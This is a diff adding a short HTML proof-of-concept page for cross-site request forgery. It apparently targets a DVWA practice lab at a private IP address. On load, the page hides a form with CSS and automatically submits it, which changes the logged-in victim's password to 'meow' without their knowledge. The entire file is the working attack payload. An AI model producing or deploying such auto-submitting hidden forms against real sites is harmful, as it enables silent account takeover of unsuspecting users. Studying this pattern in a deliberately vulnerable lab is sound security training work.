@@ -1,0 +1,20 @@
+<body onload="javascript:csrf()">
+    <script>
+    function csrf(){
+    document.getElementById("button").click();
+    }
+    </script>
+    <style>
+    form{
+    display:none;
+    }
+    </style>
+        <form action="http://192.168.200.180/vulnerabilities/csrf/?" method="GET">
+            New password:<br />
+            <input type="password" AUTOCOMPLETE="off" name="password_new" value="meow"><br />
+            Confirm new password:<br />
+            <input type="password" AUTOCOMPLETE="off" name="password_conf" value="meow"><br />
+            <br />
+            <input type="submit" id="button" name="Change" value="Change" />
+        </form>
+    </body>
